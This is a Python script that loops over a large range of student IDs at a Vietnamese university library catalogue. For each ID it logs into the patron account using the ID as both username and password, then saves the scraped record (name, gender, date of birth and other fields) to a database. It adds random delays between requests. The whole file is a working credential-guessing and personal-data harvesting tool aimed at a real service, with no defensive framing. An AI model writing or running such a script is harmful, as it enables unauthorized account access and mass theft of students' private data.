#coding:utf-8
import requests
import codecs
from bs4 import BeautifulSoup
from pymongo import MongoClient
import random, time
############################################
client = MongoClient('mongo', 27017)
db = client.hust
############################################

# sessionid = 1427912579184176591
# mssv = 20111456



def get_data_form(sessionid, mssv):
    url = "http://opac.hust.edu.vn/cgi-bin/gw_43_3/chameleon"
    raw_data = "function=PATRONATTEMPT&search=PATRON&lng=vn&conf=.%2Fchameleon.conf&sessionid="+str(sessionid)+"&skin=default&u1=12&SourceScreen=PATRONLOGIN&patronid="+str(mssv)+"&patronpassword="+str(mssv)+"&patronhost=localhost+1111+DEFAULT"
    requests.post(url=url, data=raw_data)
    url = "http://opac.hust.edu.vn/cgi-bin/gw_43_3/chameleon?patronhost=localhost%201111%20DEFAULT&search=PATRON&function=PATRONFULLCARD&SourceScreen=PATRONATTEMPT&sessionid="+str(sessionid)+"&skin=default&conf=.%2fchameleon.conf&lng=vn&u1=12&itemu1=12&pos=1&prevpos=1&"
    response = requests.get(url=url)
    soup = BeautifulSoup(response.content, 'lxml')
    data_form = soup.find('table', {'class':'patFullDetailTable'})
    if len(data_form) > 0:
        return data_form
    else:
        return None


def extract_data(data_form):
    dataset = data_form.find_all('tr')
    object_data = {}
    for data in dataset:
        if data.th.text.strip().replace(' ','_') == 'Name':
            tmp_data = data.td.text.split('-')
            object_data['Name'] = tmp_data[0].strip().replace('\n','')
            if ',' in tmp_data[1]:
                object_data['Gender'] = tmp_data[1].split(',')[1].strip().replace('\n','')
                object_data['Date_Of_Birth'] = tmp_data[1].split(',')[0].strip().replace('\n','')
            else:
                object_data["Gender"] = 'None'
                object_data['Date_Of_Birth'] = tmp_data[1].strip().replace('\n','')
        else:
            object_data[data.th.text.strip().replace(' ','_')] = data.td.text.strip().replace('\n','')
    db.students_backup.insert(object_data)


def write_error_log(mssv, error):
    print "=>> Catch error! MSSV:", mssv
    with codecs.open("error.log","a","utf-8") as fin:
        fin.write(str(mssv)+'\n'+error+'\n')


def main():
    for mssv in xrange(120010000, 120169999):
        try:
            time.sleep(random.choice([0,0,0,0,0,1,1,3,2,5,4,3]))
            data_form = get_data_form(sessionid=random.randrange(1000000000000000000, 9999999999999999999), mssv=mssv-100000000)
            if data_form != None:
                print "Get data form student_id:", mssv-100000000
                extract_data(data_form=data_form)
        except Exception as error:
            write_error_log(mssv, str(error))

if __name__ == '__main__':
    main()